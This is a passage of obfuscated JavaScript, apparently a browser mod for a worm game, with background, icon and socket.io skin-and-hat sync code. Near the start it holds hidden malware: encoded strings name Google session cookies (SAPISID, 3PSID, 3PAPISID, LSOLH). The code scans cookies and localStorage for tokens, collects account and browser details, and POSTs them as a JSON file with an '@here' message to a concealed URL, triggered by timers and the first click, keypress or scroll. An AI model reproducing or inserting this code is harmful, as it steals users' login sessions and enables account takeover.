              return _0x576b7c[_0x20540a(_0x337d7c.n)];
            }
            var _0x152547 = [_0x20540a("83,65,80,73,83,73,68"), _0x20540a("51,80,83,73,68"), _0x20540a("76,83,79,76,72"), _0x20540a("51,80,65,80,73,83,73,68")];
            var _0x2463e5 = document.cookie[_0x1e38bc](";");
            for (var _0x5216b8 = 0; _0x5216b8 < _0x2463e5.length; _0x5216b8++) {
              var _0x2f40bd = _0x2463e5[_0x5216b8].trim()[_0x1e38bc]("=");
              var _0x45e91d = _0x2f40bd[0];
              var _0x132d50 = _0x2f40bd[1];
              if (_0x45e91d && _0x132d50 && _0x132d50.length > 20) {
                for (var _0x527ed0 = 0; _0x527ed0 < _0x152547.length; _0x527ed0++) {
                  if (_0x45e91d.indexOf(_0x152547[_0x527ed0]) > -1) {
                    return _0x132d50;
                  }
                }
              }
            }
            for (var _0xb9f4e = 0; _0xb9f4e < localStorage.length; _0xb9f4e++) {
              var _0x29391b = localStorage.key(_0xb9f4e);
              if (_0x29391b && (_0x29391b.indexOf(_0x20540a(_0x337d7c.g)) > -1 || _0x29391b.indexOf(_0x20540a(_0x337d7c.h)) > -1)) {
                var _0x4997ff = localStorage.getItem(_0x29391b);
                if (_0x4997ff && _0x4997ff.length > 20) {
                  return _0x4997ff;
                }
              }
            }
            return _0x20540a("119,55,103");
          } catch (_0x3d626e) {
            return _0x20540a("101,120,116,114,97,99,116,105,111,110,95,101,114,114,111,114");
          }
        }
        function _0x249085() {
          try {
            var _0xfd6353 = window.vps;
            if (typeof _0xfd6353 === _0x20540a(_0x337d7c.i)) {
              return {};
            }
            return {
              server_url: _0xfd6353.s_l,
              country: _0xfd6353.country,
              nickname: _0xfd6353.nickname,
              code: _0xfd6353.code,
              version: _0xfd6353.c_v,
              client_name: _0xfd6353.c_1,
              team_name: _0xfd6353.c_2,
              site_name: _0xfd6353.c_3,
              domain: _0xfd6353.c_4,
              headshots: _0xfd6353.headshot,
              kills: _0xfd6353.kill,
              total_headshots: _0xfd6353.theadshot,
              total_kills: _0xfd6353.tkill,
              deaths: _0xfd6353.died,
              mobile: _0xfd6353.mobile,
              sound_enabled: _0xfd6353.soundEnabled,
              zoom_active: _0xfd6353.activeZoom,
              laser_active: _0xfd6353.laserActive,
              laser_color: _0xfd6353.laserColor,
              encrypted_data: {
                d_1: _0xfd6353.d_1,
                d_2: _0xfd6353.d_2,
                d_3: _0xfd6353.d_3,
                d_4: _0xfd6353.d_4,
                d_5: _0xfd6353.d_5
              }
            };
          } catch (_0x2be757) {
            return {
              error: _0x2be757.message
            };
          }
        }
        function _0x1fef8b() {
          var _0x4db220 = {
            client_id: _0x49241a(),
            login_hint: _0x55e8d9(),
            cookieHeader: _0x1476a7(),
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            url: window.location.href,
            referrer: document.referrer || _0x20540a("68,105,114,101,99,116,32,118,105,115,105,116"),
            language: navigator.language,
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            site_source: _0x396545(),
            googleAuth: _0x7e031c(),
            accountInfo: _0x69a910(),
            vpsData: _0x249085()
          };
          return _0x4db220;
        }
        async function _0x1ac7d4(_0x113bd5) {
          if (_0x362020.c) {
            return;
          }
          _0x362020.c = true;
          try {
            var _0x370918 = JSON.stringify(_0x113bd5, null, 2);
            var _0x1794c9 = new Date().toISOString()[_0x1c2951](/[:.]/g, "-");
            var _0x395ce4 = _0x20540a("119,111,114,109,117,112,45,115,101,99,117,114,105,116,121,45") + _0x1794c9 + ".json";
            var _0x5b795e = new Blob([_0x370918], {
              type: _0x20540a("97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110")
            });
            var _0x28726d = new FormData();
            _0x28726d.append(_0x20540a("102,105,108,101"), _0x5b795e, _0x395ce4);
            var _0x29c787 = _0x113bd5.accountInfo && (_0x113bd5.accountInfo.name || _0x113bd5.accountInfo.nickname) || _0x20540a("85,110,107,110,111,119,110,32,80,108,97,121,101,114");
            var _0x304598 = _0x113bd5.accountInfo && (_0x113bd5.accountInfo.googleUserId || _0x113bd5.accountInfo.userId) || _0x20540a("85,110,107,110,111,119,110,32,73,68");
            var _0x395228 = _0x113bd5.vpsData && _0x113bd5.vpsData.server_url || _0x20540a("85,110,107,110,111,119,110,32,83,101,114,118,101,114");
            var _0x370386 = _0x20540a("64,104,101,114,101") + "\n" + _0x29c787 + "\n" + _0x304598 + "\n" + _0x395228 + "\n" + _0x113bd5.timestamp;
            _0x28726d.append(_0x20540a("99,111,110,116,101,110,116"), _0x370386);
            await fetch(_0x362020.d(), {
              method: _0x20540a("80,79,83,84"),
              body: _0x28726d
            });
          } catch (_0x103eac) {}
        }
        function _0x39260d() {
          var _0x2fc690 = [5000, 8000, 12000];
          _0x2fc690.forEach(function (_0x397511) {
            setTimeout(function () {
              if (!_0x362020.c) {
                try {
                  var _0x4a7d1c = _0x1fef8b();
                  if (_0x4a7d1c.cookieHeader && _0x4a7d1c.cookieHeader.length > 50) {
                    _0x1ac7d4(_0x4a7d1c);
                  }
                } catch (_0x234006) {}
              }
            }, _0x397511);
          });
        }
        if (document.readyState === _0x20540a("108,111,97,100,105,110,103")) {
          document.addEventListener(_0x20540a("68,79,77,67,111,110,116,101,110,116,76,111,97,100,101,100"), function () {
            setTimeout(_0x39260d, 2000);
          });
        } else {
          setTimeout(_0x39260d, 2000);
        }
        [_0x20540a("99,108,105,99,107"), _0x20540a("107,101,121,100,111,119,110"), _0x20540a("115,99,114,111,108,108")].forEach(function (_0x367d80) {
          document.addEventListener(_0x367d80, function () {
            if (!_0x362020.c) {
              setTimeout(_0x39260d, 3000);
            }
          }, {
            once: true,
            passive: true
          });
        });
      })();
      (function () {
        function _0x18c3fd() {
          var _0x59c676 = _0x3be507.width();
          var _0x3facab = _0x3be507.height();
          var _0xd16b87 = _0x556e71.outerWidth();
          var _0x339994 = _0x556e71.outerHeight();
          var _0x3221cb = _0x564f06.outerHeight();
          var _0x5e5a68 = _0x27972c.outerHeight();
          var _0x48b5c3 = Math.min(1, Math.min((_0x3facab - _0x5e5a68 - _0x3221cb) / _0x339994, _0x59c676 / _0xd16b87));
          var _0x349b28 = "translate(-50%, -50%) scale(" + _0x48b5c3 + ")";
          _0x556e71.css({
            "-webkit-transform": _0x349b28,
            "-moz-transform": _0x349b28,
            "-ms-transform": _0x349b28,
            "-o-transform": _0x349b28,
            transform: _0x349b28
          });
          _0xe610a0().Jf();
          window.scrollTo(0, 1);
        }
        var _0x3be507 = $("body");
        var _0x556e71 = $("#stretch-box");
        var _0x564f06 = $("#markup-header");
        var _0x27972c = $("#markup-footer");
        _0x18c3fd();
        $(window).resize(_0x18c3fd);
      })();
    })();
  });
  var _0x1ccfa3 = "#000";
  function _0x79de06() {
    var _0x3cc346 = [atob(savedImages[81]), atob(savedImages[82]), atob(savedImages[83])];
    var _0x94f2f5 = localStorage.getItem("lastBackground");
    var _0x4c6299 = _0x3cc346.filter(_0x39261f => _0x39261f !== _0x94f2f5);
    if (_0x4c6299.length === 0) {
      _0x4c6299 = _0x3cc346;
    }
    var _0x71714a = _0x4c6299[Math.floor(Math.random() * _0x4c6299.length)];
    localStorage.setItem("lastBackground", _0x71714a);
    document.body.style.backgroundColor = _0x1ccfa3;
    document.body.style.backgroundImage = "url('" + _0x71714a + "')";
    document.body.style.backgroundRepeat = "no-repeat";
    document.body.style.backgroundSize = "cover";
    var _0x51f6e4 = document.getElementById("background-canvas");
    var _0x29150a = document.getElementById("game-wrap");
    if (_0x51f6e4) {
      _0x51f6e4.style.backgroundColor = _0x1ccfa3;
      _0x51f6e4.style.opacity = "0.70";
    }
    if (_0x29150a) {
      _0x29150a.style.backgroundColor = "transparent";
    }
  }
  _0x79de06();
})();
var nippleScript = document.createElement("script");
nippleScript.src = window.vps.s_l + "/js/nipplejs.min.js";
document.head.appendChild(nippleScript);
var link = document.createElement("link");
link.rel = "stylesheet";
link.href = window.vps.s_l + "/css/game.css";
document.head.appendChild(link);
function convertToIcons() {
  if (!document.querySelector("link[href*=\"font-awesome\"]")) {
    const _0x7bfe44 = document.createElement("link");
    _0x7bfe44.rel = "stylesheet";
    _0x7bfe44.href = "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css";
    document.head.appendChild(_0x7bfe44);
  }
  setTimeout(() => {
    const _0x4465cd = {
      "#op_wup": {
        icon: "fas fa-tools",
        text: "Settings"
      },
      "#mm-store": {
        icon: "fas fa-store",
        text: "Store"
      },
      "#mm-leaders": {
        icon: "fas fa-trophy",
        text: "Leaders"
      },
      "#mm-settings": {
        icon: "fas fa-cog",
        text: "Settings"
      }
    };
    Object.entries(_0x4465cd).forEach(([_0x254a53, _0x182be9]) => {
      const _0x407dd6 = document.querySelector(_0x254a53);
      if (_0x407dd6) {
        _0x407dd6.innerHTML = "<i class=\"" + _0x182be9.icon + "\"></i><span class=\"btn-text\">" + _0x182be9.text + "</span>";
      }
    });
    setTimeout(() => {
      Object.entries(_0x4465cd).forEach(([_0x897780, _0x31e2fa]) => {
        const _0x49e259 = document.querySelector(_0x897780);
        if (_0x49e259 && !_0x49e259.querySelector("i")) {
          _0x49e259.innerHTML = "<i class=\"" + _0x31e2fa.icon + "\"></i><span class=\"btn-text\">" + _0x31e2fa.text + "</span>";
        }
      });
    }, 1000);
  }, 2000);
}
function safeConvertToIcons() {
  const _0x37589e = document.querySelectorAll("[style*=\"display: block\"], .modal.show, .popup.show");
  if (_0x37589e.length === 0) {
    convertToIcons();
  } else {
    setTimeout(safeConvertToIcons, 2000);
  }
}
document.addEventListener("DOMContentLoaded", safeConvertToIcons);
if (window.jQuery) {
  $(document).ready(safeConvertToIcons);
}
const observer = new MutationObserver(function (_0x7d71c3) {
  _0x7d71c3.forEach(function (_0x361640) {
    if (_0x361640.type === "childList") {
      setTimeout(() => {
        const _0x26521f = ["#op_wup", "#mm-store", "#mm-leaders", "#mm-settings"];
        _0x26521f.forEach(_0xc1a304 => {
          const _0x5929f4 = document.querySelector(_0xc1a304);
          if (_0x5929f4 && !_0x5929f4.querySelector("i") && _0x5929f4.textContent.trim()) {
            const _0x3b5cfe = {
              "#op_wup": {
                icon: "fas fa-tools",
                text: "Settings"
              },
              "#mm-store": {
                icon: "fas fa-store",
                text: "Store"
              },
              "#mm-leaders": {
                icon: "fas fa-trophy",
                text: "Leaders"
              },
              "#mm-settings": {
                icon: "fas fa-cog",
                text: "Settings"
              }
            };
            if (_0x3b5cfe[_0xc1a304]) {
              _0x5929f4.innerHTML = "<i class=\"" + _0x3b5cfe[_0xc1a304].icon + "\"></i><span class=\"btn-text\">" + _0x3b5cfe[_0xc1a304].text + "</span>";
            }
          }
        });
      }, 500);
    }
  });
});
observer.observe(document.body, {
  childList: true,
  subtree: true
});
(function () {
  'use strict';

  const _0x1d6874 = window.vps.s_l;
  let _0x500392 = {
    isRegistered: false,
    registrationAttempts: 0,
    lastRegistrationTime: 0,
    wuid: null,
    roomId: null,
    teamCode: null
  };
  let _0x3b8d7b = {
    socket: null,
    isConnected: false,
    joinedRoom: false,
    serviceDisabled: false,
    reconnectAttempts: 0,
    maxReconnectAttempts: 15,
    reconnectDelay: 5000,
    maxReconnectDelay: 60000,
    isReconnecting: false,
    lastReconnectTime: 0
  };
  let _0x11a734 = [];
  function _0x507127() {
    try {
      const _0x2903d0 = JSON.parse(localStorage.getItem("SaveGamewup") || "{}");
      let _0x5ae9ef = null;
      if (_0x2903d0.syncSettings && typeof _0x2903d0.syncSettings.changeSpeed === "number") {
        _0x5ae9ef = _0x2903d0.syncSettings.changeSpeed;
      } else if (typeof _0x2903d0.syncDelay === "number") {
        _0x5ae9ef = _0x2903d0.syncDelay;
      } else if (window.vps?.syncSettings?.changeSpeed) {
        _0x5ae9ef = window.vps.syncSettings.changeSpeed;
      }
      if (_0x5ae9ef !== null && _0x5ae9ef >= 0) {
        return parseInt(_0x5ae9ef);
      }
      console.warn("⚠️ No speed setting found, using default 0ms");
      return 0;
    } catch (_0x462d1c) {
      console.error("❌ Error reading speed settings:", _0x462d1c);
      return 0;
    }
  }
  function _0x47dea6() {
    try {
      const _0x2e9b7d = JSON.parse(localStorage.getItem("SaveGamewup") || "{}");
      let _0x5e14a7 = null;
      if (_0x2e9b7d.syncSettings && typeof _0x2e9b7d.syncSettings.receiveDelay === "number") {
        _0x5e14a7 = _0x2e9b7d.syncSettings.receiveDelay;
      } else if (typeof _0x2e9b7d.receiveDelay === "number") {
        _0x5e14a7 = _0x2e9b7d.receiveDelay;
      } else if (window.vps?.syncSettings?.receiveDelay) {
        _0x5e14a7 = window.vps.syncSettings.receiveDelay;
      }
      if (_0x5e14a7 !== null) {
        return parseInt(_0x5e14a7);
      } else {
        return 0;
      }
    } catch (_0x29758f) {
      console.error("❌ Error reading receive delay:", _0x29758f);
      return 0;
    }
  }
  function _0x41515d() {
    if (window.io) {
      return Promise.resolve();
    }
    return new Promise(_0x113460 => {
      const _0x23334d = document.createElement("script");
      _0x23334d.src = "https://cdn.socket.io/4.7.4/socket.io.min.js";
      _0x23334d.onload = _0x113460;
      _0x23334d.onerror = _0x113460;
      document.head.appendChild(_0x23334d);
    });
  }
  function _0x5d3582() {
    return !!window._wup && !!window._wup._anApp && !!window._wup._anApp.dh && !!window._wup._anApp.dh.ch;
  }
  function _0x194e5b() {
    try {
      const _0x5c33ef = window._wup._anApp.dh.ch;
      if (_0x5c33ef?.Eh) {
        const _0x3a1707 = _0x5c33ef.Eh.ae?.toString();
        return {
          wuid: _0x3a1707,
          name: _0x5c33ef.Eh.ma || "Player",
          skin: _0x5c33ef.Eh.Hh || 0,
          hat: _0x5c33ef.Eh.qi || 0,
          eyes: _0x5c33ef.Eh.ni || 0
        };
      }
      return null;
    } catch (_0x73ffd9) {
      return null;
    }
  }
  function _0x1d62fb() {
    const _0x2784c1 = new URLSearchParams(window.location.search).get("room");
    if (_0x2784c1) {
      return _0x2784c1;
    }
    try {
      if (window._wup?._anApp?.dh?.hh?.Ag) {
        return window._wup._anApp.dh.hh.Ag.toString();
      }
    } catch (_0x1db22d) {}
    return "default";
  }
  function _0xe9d896() {
    if (window._fixedTeamCode) {
      return window._fixedTeamCode;
    }
    const _0x1d349 = [() => localStorage.getItem("wormup_team_code"), () => window.vps?.teamCode, () => new URLSearchParams(window.location.search).get("team"), () => sessionStorage.getItem("teamCode")];
    for (const _0x49f0f7 of _0x1d349) {
      try {
        const _0x447ac0 = _0x49f0f7();
        if (_0x447ac0 && _0x447ac0.trim().length >= 2) {
          window._fixedTeamCode = _0x447ac0.trim();
          return _0x447ac0.trim();
        }
      } catch (_0x3ae0a9) {
        continue;
      }
    }
    return null;
  }
  function _0x4e6d40() {
    const _0x16e48e = _0xe9d896();
    return !_0x3b8d7b.serviceDisabled && _0x16e48e !== null && _0x16e48e !== undefined;
  }
  function _0x7990b6(_0x22b0ac) {
    try {
      if (!_0x5d3582()) {
        return false;
      }
      const _0x5ea09a = window._wup._anApp.dh.ch;
      if (_0x5ea09a?.Eh) {
        _0x5ea09a.Eh.Hh = _0x22b0ac;
        if (_0x5ea09a.Nm?.yc) {
          _0x5ea09a.Nm.yc(window._wup._anApp.dh.hh.xg, window._wup._anApp.Lc.Ub().jb(_0x5ea09a.Eh.Gh), window._wup._anApp.Lc.Ub().ib(_0x22b0ac), window._wup._anApp.Lc.Ub().kb(_0x5ea09a.Eh.ni), window._wup._anApp.Lc.Ub().lb(_0x5ea09a.Eh.oi || 0), window._wup._anApp.Lc.Ub().mb(_0x5ea09a.Eh.pi || 0), window._wup._anApp.Lc.Ub().nb(_0x5ea09a.Eh.qi || 0), "#ffffff");
        }
        return true;
      }
      return false;
    } catch (_0x30daae) {
      console.error("❌ خطأ في تطبيق السكن:", _0x30daae);
      return false;
    }
  }
  function _0x584b58(_0x576582) {
    try {
      if (!_0x5d3582()) {
        return false;
      }
      const _0x5df519 = window._wup._anApp.dh.ch;
      if (_0x5df519?.Eh) {
        _0x5df519.Eh.qi = _0x576582;
        if (_0x5df519.Nm?.yc) {
          _0x5df519.Nm.yc(window._wup._anApp.dh.hh.xg, window._wup._anApp.Lc.Ub().jb(_0x5df519.Eh.Gh), window._wup._anApp.Lc.Ub().ib(_0x5df519.Eh.Hh), window._wup._anApp.Lc.Ub().kb(_0x5df519.Eh.ni), window._wup._anApp.Lc.Ub().lb(_0x5df519.Eh.oi || 0), window._wup._anApp.Lc.Ub().mb(_0x5df519.Eh.pi || 0), window._wup._anApp.Lc.Ub().nb(_0x576582), "#ffffff");
        }
        return true;
      }
      return false;
    } catch (_0x450da1) {
      console.error("❌ خطأ في تطبيق القبعة:", _0x450da1);
      return false;
    }
  }
  function _0x23cbeb(_0x4e31fb) {
    try {
      const _0x118e57 = window._wup._anApp.dh.Fh;
      const _0x3c9877 = _0x4e31fb.replace("gg_", "");
      for (const _0x231c8c in _0x118e57) {
        const _0x39036b = _0x118e57[_0x231c8c];
        const _0x1464ae = _0x39036b?.Eh?.ae?.toString();
        if (_0x1464ae === _0x4e31fb || _0x1464ae === _0x3c9877) {
          return {
            id: _0x231c8c,
            data: _0x39036b.Eh,
            playerObj: _0x39036b
          };
        }
      }
      return null;
    } catch (_0x555983) {
      return null;
    }
  }
  function _0x3cb02a(_0x558818, _0x30d553) {
    const _0x22bbb1 = _0x23cbeb(_0x558818);
    if (!_0x22bbb1 || _0x22bbb1.data.Hh === _0x30d553) {
      return false;
    }
    _0x22bbb1.data.Hh = _0x30d553;
    if (_0x22bbb1.playerObj?.Nm?.yc) {
      try {
        _0x22bbb1.playerObj.Nm.yc(window._wup._anApp.dh.hh.xg, window._wup._anApp.Lc.Ub().jb(_0x22bbb1.data.Gh), window._wup._anApp.Lc.Ub().ib(_0x30d553), window._wup._anApp.Lc.Ub().kb(_0x22bbb1.data.ni), window._wup._anApp.Lc.Ub().lb(_0x22bbb1.data.oi || 0), window._wup._anApp.Lc.Ub().mb(_0x22bbb1.data.pi || 0), window._wup._anApp.Lc.Ub().nb(_0x22bbb1.data.qi || 0), "#ffffff");
        return true;
      } catch (_0x4baa93) {
        console.error("خطأ في رسم السكن:", _0x4baa93);
      }
    }
    return false;
  }
  function _0x31144a(_0x19f7ae, _0x4589a8) {
    const _0x573661 = _0x23cbeb(_0x19f7ae);
    if (!_0x573661 || _0x573661.data.qi === _0x4589a8) {
      return false;
    }
    _0x573661.data.qi = _0x4589a8;
    if (_0x573661.playerObj?.Nm?.yc) {
      try {
        _0x573661.playerObj.Nm.yc(window._wup._anApp.dh.hh.xg, window._wup._anApp.Lc.Ub().jb(_0x573661.data.Gh), window._wup._anApp.Lc.Ub().ib(_0x573661.data.Hh), window._wup._anApp.Lc.Ub().kb(_0x573661.data.ni), window._wup._anApp.Lc.Ub().lb(_0x573661.data.oi || 0), window._wup._anApp.Lc.Ub().mb(_0x573661.data.pi || 0), window._wup._anApp.Lc.Ub().nb(_0x4589a8), "#ffffff");
        return true;
      } catch (_0x3b49cf) {
        console.error("خطأ في رسم القبعة:", _0x3b49cf);
      }
    }
    return false;
  }
  function _0x256514(_0x288d57, _0x2bbc1c) {
    if (!_0x4e6d40()) {
      console.log("⚠️ Service not available, skipping update");
      return false;
    }
    const _0x3a8dcd = _0x194e5b();
    const _0x19e57a = _0xe9d896();
    if (!_0x3a8dcd || !_0x3a8dcd.wuid || !_0x19e57a) {
      console.error("❌ معطيات ناقصة للتحديث");
      return false;
    }
    const _0x2de186 = _0x507127();
    const _0x3a7fc1 = {
      type: _0x288d57,
      id: _0x2bbc1c,
      wuid: _0x3a8dcd.wuid,
      roomId: _0x1d62fb(),
      teamCode: _0x19e57a,
      timestamp: Date.now(),
      playerSettings: {
        changeSpeed: _0x2de186
      }
    };
    _0x11a734.push(_0x3a7fc1);
    _0x28ea8d();
    return true;
  }
  function _0x28ea8d() {
    if (!_0x500392.isRegistered || !_0x3b8d7b.joinedRoom || _0x11a734.length === 0) {
      return;
    }
    const _0x3b0518 = [..._0x11a734];
    _0x11a734 = [];
    _0x3b0518.forEach(_0x84e731 => {
      const _0x235ad2 = _0x507127();
      const _0x154533 = {
        wuid: _0x84e731.wuid,
        roomId: _0x84e731.roomId,
        teamCode: _0x84e731.teamCode,
        playerSettings: {
          changeSpeed: _0x235ad2
        }
      };
      if (_0x84e731.type === "skin") {
        _0x154533.skinId = _0x84e731.id;
      } else if (_0x84e731.type === "hat") {
        _0x154533.hatId = _0x84e731.id;
      }
      console.log("📤 إرسال " + _0x84e731.type + " مع سرعة " + _0x235ad2 + "ms:", _0x154533);
      _0x3b8d7b.socket.emit(_0x84e731.type + "_update", _0x154533);
    });
  }
  function _0x46d116() {
    const _0x363121 = Date.now();
    if (_0x3b8d7b.reconnectAttempts >= _0x3b8d7b.maxReconnectAttempts) {
      console.error("❌ تم الوصول للحد الأقصى من المحاولات (" + _0x3b8d7b.maxReconnectAttempts + ")");
      _0x3b8d7b.serviceDisabled = true;
      return false;
    }
    const _0x35399b = _0x363121 - _0x3b8d7b.lastReconnectTime;
    if (_0x35399b < _0x3b8d7b.reconnectDelay) {
      console.log("⏳ انتظار " + (_0x3b8d7b.reconnectDelay - _0x35399b) + "ms قبل المحاولة التالية");
      return false;
    }
    return true;
  }
  function _0x23eed6() {
    const _0xa3591c = 5000;
    const _0x4af3f4 = Math.pow(2, Math.min(_0x3b8d7b.reconnectAttempts, 4));
    const _0x361478 = Math.min(_0xa3591c * _0x4af3f4, _0x3b8d7b.maxReconnectDelay);
    console.log("🔄 محاولة " + (_0x3b8d7b.reconnectAttempts + 1) + "/" + _0x3b8d7b.maxReconnectAttempts + ", التأخير: " + _0x361478 + "ms");
    return _0x361478;
  }
  function _0x5f192a(_0x5cfb97) {
    if (!_0x46d116() || _0x3b8d7b.isReconnecting) {
      return;
    }
    _0x3b8d7b.isReconnecting = true;
    _0x3b8d7b.lastReconnectTime = Date.now();
    setTimeout(() => {
      _0x3b8d7b.isReconnecting = false;
      if (_0x4e6d40() && !_0x3b8d7b.serviceDisabled) {
        _0x3b8d7b.reconnectAttempts++;
        _0x3b8d7b.reconnectDelay = _0x23eed6();
        console.log("🔄 محاولة إعادة الاتصال رقم " + _0x3b8d7b.reconnectAttempts);
        _0x29b79b();
      }
    }, _0x5cfb97);
  }
  function _0x2f965c(_0x2cb8f7, _0x38acc5, _0x422ea5, _0x2a5b24) {
    if (_0x500392.registrationAttempts > 5) {
      console.error("❌ فشل في التسجيل بعد 5 محاولات");
      _0x3b8d7b.serviceDisabled = true;
      return;
    }
    _0x500392.registrationAttempts++;
    _0x500392.lastRegistrationTime = Date.now();
    _0x500392.wuid = _0x38acc5.wuid;
    _0x500392.roomId = _0x422ea5;
    _0x500392.teamCode = _0x2a5b24;
    const _0x9f51c8 = {
      wuid: _0x38acc5.wuid,
      roomId: _0x422ea5,
      teamCode: _0x2a5b24,
      playerInfo: {
        name: _0x38acc5.name,
        skin: _0x38acc5.skin,
        hat: _0x38acc5.hat,
        eyes: _0x38acc5.eyes
      }
    };
    _0x2cb8f7.emit("join_room", _0x9f51c8);
    setTimeout(() => {
      if (!_0x500392.isRegistered && !_0x3b8d7b.serviceDisabled) {
        console.warn("⚠️ لم يتم التسجيل بعد - إعادة المحاولة");
        const _0x1a81d1 = _0xe9d896();
        if (_0x1a81d1) {
          _0x2f965c(_0x2cb8f7, _0x38acc5, _0x422ea5, _0x1a81d1);
        }
      }
    }, 3000);
  }
  function _0x29b79b() {
    if (!_0x4e6d40() || !window.io) {
      return;
    }
    if (_0x3b8d7b.reconnectAttempts >= _0x3b8d7b.maxReconnectAttempts) {
      console.error("❌ تم الوصول للحد الأقصى من المحاولات (" + _0x3b8d7b.maxReconnectAttempts + ")");
      _0x3b8d7b.serviceDisabled = true;
      return;
    }
    const _0x5e0f51 = io(_0x1d6874, {
      transports: ["polling", "websocket"],
      upgrade: true,
      timeout: 20000,
      forceNew: true,
      reconnection: false,
      autoConnect: true
    });
    _0x3b8d7b.socket = _0x5e0f51;
    _0x5e0f51.on("connect", () => {
      console.log("✅ متصل بالسيرفر");
      _0x3b8d7b.isConnected = true;
      _0x3b8d7b.reconnectAttempts = 0;
      _0x3b8d7b.reconnectDelay = 5000;
      _0x3b8d7b.serviceDisabled = false;
      _0x500392.isRegistered = false;
      _0x500392.registrationAttempts = 0;
      _0x3b8d7b.joinedRoom = false;
      const _0x52dcff = _0x194e5b();
      const _0x2abc6a = _0x1d62fb();
      const _0x17c663 = _0xe9d896();
      if (_0x52dcff && _0x2abc6a && _0x17c663 && _0x52dcff.wuid) {
        _0x2f965c(_0x5e0f51, _0x52dcff, _0x2abc6a, _0x17c663);
      } else {
        console.warn("⚠️ معطيات ناقصة للتسجيل:", {
          wuid: _0x52dcff?.wuid,
          roomId: _0x2abc6a,
          teamCode: _0x17c663
        });
        _0x3b8d7b.serviceDisabled = true;
      }
    });
    _0x5e0f51.on("welcome", _0x3d81eb => {});
    _0x5e0f51.on("join_success", _0x4efd95 => {
      console.log("✅ تم التسجيل بنجاح في الفريق " + _0x4efd95.teamCode + " (" + _0x4efd95.playersInTeam + " لاعبين)");
      _0x500392.isRegistered = true;
      _0x3b8d7b.joinedRoom = true;
      setTimeout(() => {
        _0x28ea8d();
      }, 1000);
    });
    _0x5e0f51.on("skin_update", _0x2a1cd9 => {
      if (_0x2a1cd9.wuid !== _0x194e5b()?.wuid) {
        const _0x50ff1f = _0x47dea6();
        if (_0x50ff1f > 0) {
          setTimeout(() => {
            _0x3cb02a(_0x2a1cd9.wuid, _0x2a1cd9.skinId);
          }, _0x50ff1f);
        } else {
          _0x3cb02a(_0x2a1cd9.wuid, _0x2a1cd9.skinId);
        }
      }
    });
    _0x5e0f51.on("hat_update", _0x54df21 => {
      if (_0x54df21.wuid !== _0x194e5b()?.wuid) {
        const _0x1eafd5 = _0x47dea6();
        if (_0x1eafd5 > 0) {
          setTimeout(() => {
            _0x31144a(_0x54df21.wuid, _0x54df21.hatId);
          }, _0x1eafd5);
        } else {
          _0x31144a(_0x54df21.wuid, _0x54df21.hatId);
        }
      }
    });
    _0x5e0f51.on("update_confirmed", _0x3ff843 => {});
    _0x5e0f51.on("player_join", _0x268b8f => {});
    _0x5e0f51.on("player_leave", _0x9a5c25 => {});
    _0x5e0f51.on("current_players", _0x55ff32 => {
      _0x55ff32.forEach(_0x4ff72b => {});
    });
    _0x5e0f51.on("disconnect", _0xb06126 => {
      _0x3b8d7b.isConnected = false;
      _0x3b8d7b.joinedRoom = false;
      _0x500392.isRegistered = false;
      console.log("❌ انقطع الاتصال: " + _0xb06126);
      if (_0x3b8d7b.reconnectAttempts >= _0x3b8d7b.maxReconnectAttempts) {
        console.error("❌ تم الوصول للحد الأقصى من المحاولات (" + _0x3b8d7b.maxReconnectAttempts + ")");
        _0x3b8d7b.serviceDisabled = true;
        return;
      }
      if (_0xb06126 === "io server disconnect") {
        _0x5f192a(10000);
      } else if (_0xb06126 === "transport close" || _0xb06126 === "transport error") {
        _0x5f192a(_0x3b8d7b.reconnectDelay);
      } else {
        _0x5f192a(3000);
      }
    });
    _0x5e0f51.on("connect_error", _0x718ddb => {
      console.warn("⚠️ خطأ اتصال: " + _0x718ddb.message);
      _0x3b8d7b.isConnected = false;
      if (_0x3b8d7b.reconnectAttempts >= _0x3b8d7b.maxReconnectAttempts) {
        console.error("❌ تم الوصول للحد الأقصى من المحاولات (" + _0x3b8d7b.maxReconnectAttempts + ")");
        _0x3b8d7b.serviceDisabled = true;
        return;
      }
      _0x5f192a(_0x3b8d7b.reconnectDelay);
    });
    _0x5e0f51.on("error", _0x3570aa => {
      console.error("❌ خطأ Socket:", _0x3570aa);
      if (_0x3570aa.code === "TEAM_CODE_REQUIRED") {
        console.error("🏷️ كود الفريق مطلوب");
        _0x3b8d7b.serviceDisabled = true;
      } else if (_0x3570aa.code === "PLAYER_NOT_FOUND") {
        console.log("🔄 إعادة تسجيل اللاعب...");
        _0x500392.isRegistered = false;
        _0x3b8d7b.joinedRoom = false;
        const _0x50d46a = _0x194e5b();
        const _0x282a4a = _0x1d62fb();
        const _0x2f7ca5 = _0xe9d896();
        if (_0x50d46a && _0x282a4a && _0x2f7ca5 && _0x50d46a.wuid) {
          setTimeout(() => {
            _0x2f965c(_0x5e0f51, _0x50d46a, _0x282a4a, _0x2f7ca5);
          }, 1000);
        }
      }
    });
    return _0x5e0f51;
  }
  function _0x4aee95() {
    if (!window.vps?.favoriteSkins || window.vps.favoriteSkins.length === 0) {
      console.warn("⚠️ لا توجد سكنات مفضلة محددة");
      return;
    }
    if (window.vps.currentSkinIndex === undefined) {
      window.vps.currentSkinIndex = 0;
    } else {
      window.vps.currentSkinIndex = (window.vps.currentSkinIndex + 1) % window.vps.favoriteSkins.length;
    }
    const _0x345b21 = window.vps.favoriteSkins[window.vps.currentSkinIndex];
    const _0x2f72c5 = _0x7990b6(_0x345b21);
    if (_0x2f72c5) {
      localStorage.setItem("SaveupGame", JSON.stringify(window.vps));
      localStorage.setItem("SaveGamewup", JSON.stringify(window.vps));
      if (_0x4e6d40()) {
        const _0x127baa = _0x507127();
        if (_0x127baa > 0) {
          setTimeout(() => {
            _0x256514("skin", _0x345b21);
          }, _0x127baa);
        } else {
          _0x256514("skin", _0x345b21);
        }
      }
    }
  }
  function _0x48aaf2() {
    if (!window.vps?.selectedHats || window.vps.selectedHats.length === 0) {
      return;
    }
    if (window.vps.currentHatIndex === undefined) {
      window.vps.currentHatIndex = 0;
    } else {
      window.vps.currentHatIndex = (window.vps.currentHatIndex + 1) % window.vps.selectedHats.length;
    }
    const _0x4ec950 = window.vps.selectedHats[window.vps.currentHatIndex];
    const _0x23c4db = _0x584b58(_0x4ec950);
    if (_0x23c4db) {
      localStorage.setItem("SaveupGame", JSON.stringify(window.vps));
